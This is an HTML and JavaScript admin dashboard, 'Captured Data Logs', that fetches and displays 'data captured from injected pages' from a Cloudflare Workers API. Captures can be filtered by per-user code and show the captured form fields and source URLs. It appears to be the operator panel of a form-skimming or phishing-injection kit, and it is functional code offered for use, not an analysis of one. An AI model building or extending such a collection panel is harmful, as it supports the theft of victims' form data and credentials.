<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Captured Data Dashboard</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    fontFamily: { sans: ['Inter', 'sans-serif'] },
                    colors: {
                        dark: '#0a0a0a',
                        darker: '#000000',
                        panel: '#111111',
                        border: '#222222',
                        primary: '#0070f3',
                        primaryHover: '#0051b3',
                    }
                }
            }
        }
    </script>
    <style>
        body { font-family: 'Inter', sans-serif; background-color: #000; color: #fff; }
        .glass-panel { background: rgba(17, 17, 17, 0.7); backdrop-filter: blur(10px); border: 1px solid #222; border-radius: 12px; }
        .input-field { background: #1a1a1a; border: 1px solid #333; color: #fff; }
        .input-field:focus { border-color: #0070f3; outline: none; }

        .spinner {
            border: 2px solid rgba(255, 255, 255, 0.1);
            border-left-color: #0070f3;
            border-radius: 50%;
            width: 16px;
            height: 16px;
            animation: spin 1s linear infinite;
            display: inline-block;
            vertical-align: middle;
            margin-right: 8px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* Toast Container */
        #toast-container { position: fixed; top: 20px; right: 20px; z-index: 9999; display: flex; flex-direction: column; gap: 10px; }
        .custom-toast { background: rgba(17, 17, 17, 0.9); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.08); color: white; padding: 16px 24px; border-radius: 8px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); font-size: 14px; display: flex; align-items: center; gap: 12px; opacity: 0; transform: translateX(100%); transition: opacity 0.3s ease, transform 0.3s ease; }
        .custom-toast.show { opacity: 1; transform: translateX(0); }
        .custom-toast.success { border-left: 4px solid #17c964; }
        .custom-toast.error { border-left: 4px solid #f31260; }
        .custom-toast.warning { border-left: 4px solid #f5a524; }

        table { width: 100%; text-align: left; border-collapse: separate; border-spacing: 0; }
        th { padding: 12px 16px; background: rgba(255,255,255,0.02); border-bottom: 1px solid #333; color: #888; font-weight: 500; font-size: 12px; text-transform: uppercase; letter-spacing: 0.05em; }
        td { padding: 16px; border-bottom: 1px solid #222; font-size: 14px; }
        tr:last-child td { border-bottom: none; }
        tr:hover td { background: rgba(255,255,255,0.01); }
    </style>
</head>
<body class="bg-darker text-white min-h-screen p-4 md:p-8">
    <div class="max-w-6xl mx-auto glass-panel p-6 md:p-10">
        <div class="mb-6">
            <a href="admin.html" class="text-gray-400 hover:text-white transition-colors inline-flex items-center text-sm font-medium">
                <svg class="w-4 h-4 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"></path></svg>
                Back to Admin Panel
            </a>
        </div>

        <div class="flex flex-col md:flex-row justify-between items-start md:items-center mb-8 gap-4 border-b border-border pb-6">
            <div>
                <h1 class="text-3xl font-bold bg-clip-text text-transparent bg-gradient-to-r from-red-400 to-red-600 flex items-center">
                    🕵️ Captured Data Logs
                </h1>
                <p class="text-gray-400 mt-2 text-sm">Real-time data captured from injected pages.</p>
            </div>

            <div class="flex flex-col sm:flex-row gap-3 w-full md:w-auto">
                <select id="user-filter" class="input-field px-4 py-2 rounded-md text-sm w-full md:w-64" onchange="filterByUser()">
                    <option value="">All Users</option>
                </select>
                <button onclick="loadData(null, true)" class="bg-border hover:bg-gray-700 text-white px-4 py-2 rounded-md text-sm font-medium transition-colors whitespace-nowrap">
                    Refresh Logs
                </button>
            </div>
        </div>

        <div id="loading" class="text-center py-10 text-gray-400">
            <span class="spinner"></span> Loading data...
        </div>

        <div class="flex justify-between items-center mb-6">
            <div class="text-sm text-gray-500 font-medium" id="page-info">Page 1</div>
            <div class="flex gap-2">
                <button id="prev-page" class="bg-border hover:bg-gray-700 text-white px-4 py-2 rounded-md text-sm font-medium transition-colors disabled:opacity-50 disabled:cursor-not-allowed">
                    &laquo; Prev
                </button>
                <button id="next-page" class="bg-border hover:bg-gray-700 text-white px-4 py-2 rounded-md text-sm font-medium transition-colors disabled:opacity-50 disabled:cursor-not-allowed">
                    Next &raquo;
                </button>
            </div>
        </div>

        <table id="data-table" style="display:none;">
            <thead>
                <tr>
                    <th style="width: 180px;">Time</th>
                    <th>Data Payload</th>
                </tr>
            </thead>
            <tbody id="table-body">
            </tbody>
        </table>
    </div>

    <script>
        const WORKER_URL = 'https://calm-bread-1d99.testdx24.workers.dev';

        let currentPage = 1;
        let cursorHistory = [];
        let currentCursor = null;
        let hasMore = false;
        const itemsPerPage = 20;
        let currentUserFilter = '';

        async function loadUsersForFilter() {
            try {
                const res = await fetch(`${WORKER_URL}/api/admin/users`, { credentials: 'include' });
                const data = await res.json();
                if (data.success) {
                    const select = document.getElementById('user-filter');
                    data.data.forEach(u => {
                        const option = document.createElement('option');
                        option.value = u.code;
                        option.textContent = `${u.username || 'No Name'} (${u.code})`;
                        select.appendChild(option);
                    });
                }
            } catch(e) {}
        }
        loadUsersForFilter();

        function filterByUser() {
            currentUserFilter = document.getElementById('user-filter').value;
            currentPage = 1;
            cursorHistory = [];
            currentCursor = null;
            loadData(null, true);
        }

        document.getElementById('prev-page').addEventListener('click', () => {
            if (currentPage > 1) {
                currentPage--;
                // Pop the current cursor we are at
                cursorHistory.pop();
                // Get the cursor for the previous page, or null if going to page 1
                currentCursor = cursorHistory.length > 0 ? cursorHistory[cursorHistory.length - 1] : null;
                // Pop it again so loadData can push it back
                if (cursorHistory.length > 0) cursorHistory.pop();
                loadData(currentCursor);
            }
        });

        document.getElementById('next-page').addEventListener('click', () => {
            if (hasMore) {
                currentPage++;
                loadData(currentCursor);
            }
        });

        async function loadData(cursor = null, reset = false) {
            if (reset) {
                cursorHistory = [];
                currentCursor = null;
                currentPage = 1;
            }
            try {
                document.getElementById('loading').style.display = 'block';
                document.getElementById('data-table').style.display = 'none';

                let url = `${WORKER_URL}/api/captures?limit=${itemsPerPage}`;
                if (cursor) {
                    url += `&cursor=${encodeURIComponent(cursor)}`;
                }
                if (currentUserFilter) {
                    url += `&userCode=${encodeURIComponent(currentUserFilter)}`;
                }
                const response = await fetch(url, { credentials: 'include' });

                if (response.status === 401) {
                    window.location.href = 'admin-login.html';
                    return;
                }

                const result = await response.json();

                if (result.success) {
                    // Save the current cursor we used to get to this page
                    if (cursorHistory.length === 0 || cursorHistory[cursorHistory.length - 1] !== cursor) {
                        cursorHistory.push(cursor);
                    }

                    // Update state for next page
                    currentCursor = result.cursor;
                    hasMore = !result.list_complete && result.cursor;

                    document.getElementById('page-info').innerText = `Page ${currentPage}`;
                    document.getElementById('prev-page').disabled = currentPage === 1;
                    document.getElementById('next-page').disabled = !hasMore;

                    renderTable(result.data);
                } else {
                    document.getElementById('loading').innerText = 'Error loading data: ' + result.error;
                }
            } catch (err) {
                document.getElementById('loading').innerText = 'Network Error: ' + err.message;
            }
        }

        function renderTable(data) {
            const tbody = document.getElementById('table-body');
            const table = document.getElementById('data-table');
            const loading = document.getElementById('loading');

            loading.style.display = 'none';
            table.style.display = 'table';
            tbody.innerHTML = '';

            // Sort by timestamp descending
            data.sort((a, b) => {
                const timeA = (a.data && a.data.timestamp) || a.timestamp || 0;
                const timeB = (b.data && b.data.timestamp) || b.timestamp || 0;
                return timeB - timeA;
            });

            if (data.length === 0) {
                tbody.innerHTML = '<tr><td colspan="2" class="text-center text-gray-500 py-10">No captured data found.</td></tr>';
                return;
            }

            data.forEach(item => {
                const row = document.createElement('tr');

                let timeStr = "Unknown";
                let uniqueCode = "Unknown";

                if (item.data && item.data.timestamp) {
                    timeStr = new Date(item.data.timestamp).toLocaleString();
                } else if (item.timestamp) {
                    timeStr = new Date(item.timestamp).toLocaleString();
                }

                if (item.key) {
                    const parts = item.key.split('::');
                    if (parts.length >= 2) {
                        uniqueCode = parts[1];
                    }
                    if (parts.length >= 3 && timeStr === "Unknown") {
                        const ts = parseInt(parts[2]);
                        if (!isNaN(ts)) {
                            timeStr = new Date(ts).toLocaleString();
                        }
                    }
                }

                const payload = item.data ? (item.data.data || item.data.formData || item.data) : item;

                // Construct beautiful Key-Value view
                let dataHtml = '<div class="grid grid-cols-1 md:grid-cols-2 gap-3">';
                if (typeof payload === 'object' && payload !== null) {
                    for (const [key, value] of Object.entries(payload)) {
                        if (key === 'timestamp' || key === 'url' || key === 'userAgent' || key === 'uniqueCode' || key === 'formData') continue;
                        if (typeof value === 'object') continue; // Skip nested objects for simplicity in this view

                        dataHtml += `
                            <div class="bg-[#1a1a1a] p-3 rounded border border-[#333]">
                                <div class="text-xs text-gray-500 uppercase tracking-wider mb-1">${key}</div>
                                <div class="text-white font-mono text-sm break-all">${value}</div>
                            </div>
                        `;
                    }

                    if (payload.url) {
                        dataHtml += `
                            <div class="bg-[#1a1a1a] p-3 rounded border border-[#333] md:col-span-2">
                                <div class="text-xs text-gray-500 uppercase tracking-wider mb-1">Source URL</div>
                                <div class="text-blue-400 text-sm break-all"><a href="${payload.url}" target="_blank" class="hover:underline">${payload.url}</a></div>
                            </div>
                        `;
                    }
                } else {
                    dataHtml = `<pre class="bg-[#1a1a1a] p-4 rounded border border-[#333] text-sm text-gray-300 overflow-x-auto">${JSON.stringify(payload, null, 2)}</pre>`;
                }
                dataHtml += '</div>';


                let urlStr = "Unknown";
                if (payload && payload.url) {
                    urlStr = payload.url;
                } else if (item && item.url) {
                    urlStr = item.url;
                }

                const safeUrl = String(urlStr).replace(/[&<>"']/g, function(m) {
                    return {
                        '&': '&amp;',
                        '<': '&lt;',
                        '>': '&gt;',
                        '"': '&quot;',
                        "'": '&#39;'
                    }[m];
                });

                const timeCell = document.createElement('td');
                timeCell.className = 'align-top';
                timeCell.innerHTML = `<div class="font-medium text-white mb-1">${timeStr}</div>
                <div class="text-xs text-gray-500 bg-[#222] inline-block px-2 py-1 rounded mb-1">User: ${uniqueCode}</div>
                <div class="text-xs text-blue-400 bg-blue-900/20 border border-blue-800/30 inline-block px-2 py-1 rounded">URL: <a href="${safeUrl}" target="_blank" class="hover:underline">${safeUrl}</a></div>`;


                const dataCell = document.createElement('td');
                dataCell.innerHTML = dataHtml;

                row.appendChild(timeCell);
                row.appendChild(dataCell);

                tbody.appendChild(row);
            });
        }

        // Load on start
        loadData(null, true);


    </script>

<style>
/* Toast Container */
#toast-container {
    position: fixed;
    top: 20px;
    right: 20px;
    z-index: 9999;
    display: flex;
    flex-direction: column;
    gap: 10px;
}

/* Toast Element */
.custom-toast {
    background: rgba(17, 17, 17, 0.9);
    backdrop-filter: blur(10px);
    -webkit-backdrop-filter: blur(10px);
    border: 1px solid rgba(255, 255, 255, 0.08);
    color: white;
    padding: 16px 24px;
    border-radius: 8px;
    box-shadow: 0 10px 25px rgba(0,0,0,0.5);
    font-family: 'Inter', sans-serif;
    font-size: 14px;
    display: flex;
    align-items: center;
    gap: 12px;
    opacity: 0;
    transform: translateX(100%);
    transition: opacity 0.3s ease, transform 0.3s ease;
}

.custom-toast.show {
    opacity: 1;
    transform: translateX(0);
}

.custom-toast.success { border-left: 4px solid #17c964; }
.custom-toast.error { border-left: 4px solid #f31260; }
.custom-toast.warning { border-left: 4px solid #f5a524; }
</style>
<div id="toast-container"></div>
<script>
function showToast(message, type = 'success') {
    const container = document.getElementById('toast-container');
    const toast = document.createElement('div');
    toast.className = `custom-toast ${type}`;

    let icon = '✅';
    if(type === 'error') icon = '❌';
    if(type === 'warning') icon = '⚠️';

    toast.innerHTML = `<span>${icon}</span> <span>${message}</span>`;
    container.appendChild(toast);

    setTimeout(() => {
        toast.classList.add('show');
    }, 10);

    setTimeout(() => {
        toast.classList.remove('show');
        setTimeout(() => toast.remove(), 300);
    }, 3000);
}
</script>

</body>
</html>
